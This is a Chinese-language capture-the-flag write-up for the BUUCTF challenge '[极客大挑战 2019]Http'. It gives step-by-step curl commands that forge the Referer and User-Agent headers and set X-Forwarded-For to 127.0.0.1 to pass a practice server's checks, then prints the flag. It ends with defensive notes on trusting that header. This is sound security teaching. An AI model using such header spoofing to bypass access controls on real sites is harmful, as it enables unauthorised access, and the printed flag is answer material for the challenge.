---
title: "[极客大挑战 2019]Http"
date: 2026-05-02
categories:
 - BUUCTF
 - WEB
---

# [极客大挑战 2019]Http

## 题目描述

访问页面，发现是 Syclover 三叶草小组的宣传页面。页面HTML源码中隐藏了一个 `Secret.php` 链接，需要通过多层HTTP请求头的伪造来获取 flag。

## 解题步骤

### Step 1: 发现隐藏页面

查看首页 HTML 源码，发现隐藏的链接：

```html
<a style="border:none;cursor:default;" onclick="return false" href="Secret.php">氛围</a>
```

用 `curl` 查看响应头确认服务器信息：

```bash
curl -s -I http://node5.buuoj.cn:29582/
```

输出：
```
HTTP/1.1 200 OK
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.3.3
```

### Step 2: 伪造 Referer 来源

访问 `Secret.php`，页面提示：

> It doesn't come from 'https://Sycsecret.buuoj.cn'

说明需要设置 `Referer` 请求头为该 URL：

```bash
curl -s -e "https://Sycsecret.buuoj.cn" http://node5.buuoj.cn:29582/Secret.php
```

`-e` 参数用于设置 Referer 头。

### Step 3: 伪造 User-Agent 浏览器标识

加上 Referer 后，页面显示：

> Please use "Syclover" browser

说明需要将 `User-Agent` 设置为 `Syclover`：

```bash
curl -s -e "https://Sycsecret.buuoj.cn" -A "Syclover" http://node5.buuoj.cn:29582/Secret.php
```

`-A` 参数用于设置 User-Agent 头。

### Step 4: 伪造本地访问来源 IP

加上浏览器标识后，页面显示：

> No!!! you can only read this locally!!!

说明需要伪装成本地访问，使用 `X-Forwarded-For` 头将来源IP设为 `127.0.0.1`：

```bash
curl -s -e "https://Sycsecret.buuoj.cn" -A "Syclover" -H "X-Forwarded-For: 127.0.0.1" http://node5.buuoj.cn:29582/Secret.php
```

`-H` 参数用于添加自定义请求头。

### 最终命令

```bash
curl -s \
  -e "https://Sycsecret.buuoj.cn" \ #伪造Http Referer 请求头，告诉服务器，当前请求是从哪个页面跳转过来的
  -A "Syclover" \                   #请求头，客户端身份（如手机、浏览器、爬虫）
  -H "X-Forwarded-For: 127.0.0.1" \  # -H手动自定义任意 HTTP 请求头,这里代表伪装客户端 IP 为本地
  http://node5.buuoj.cn:29582/Secret.php
```

## Flag

```
flag{ec8908c2-1dcb-40e8-99cf-b56fcbd8e1a8}
```

## 知识点总结

### 1. HTTP 请求头伪造

本题考察了三种常见的 HTTP 请求头伪造技术：

| 请求头 | 作用 | curl 参数 |
|--------|------|-----------|
| `Referer` | 标识请求来源页面 | `-e` / `--referer` |
| `User-Agent` | 标识客户端浏览器类型 | `-A` / `--user-agent` |
| `X-Forwarded-For` | 标识请求的真实客户端IP（代理转发） | `-H` / `--header` |

### 2. X-Forwarded-For (XFF)

- `X-Forwarded-For` 是一个 HTTP 扩展头，用于识别通过代理或负载均衡连接的客户端的原始IP地址
- 在 PHP 中，`$_SERVER['REMOTE_ADDR']` 可能被此头覆盖（取决于服务器配置），导致服务端认为请求来自伪造的地址
- 类似伪装的头部还有：`X-Real-IP`、`Client-IP`、`X-Originating-IP` 等

### 3. 服务端IP验证的安全问题

- 许多应用通过检查 IP 地址来判断是否为本地/内网访问
- 如果有反向代理，后端需要注意从 `X-Forwarded-For` 中正确提取真实IP
- 安全做法：只在信任的代理链中使用 X-Forwarded-For，否则应忽略该头

### 4. curl 常用参数速查

| 参数 | 说明 |
|------|------|
| `-s` | 静默模式，不显示进度 |
| `-I` | 只获取响应头（HEAD 请求） |
| `-e URL` | 设置 Referer |
| `-A STR` | 设置 User-Agent |
| `-H "Key: Val"` | 添加自定义请求头 |
| `-v` | 显示详细通信过程 |
| `-X METHOD` | 指定请求方法（GET/POST等） |
| `-d DATA` | 发送 POST 数据 |
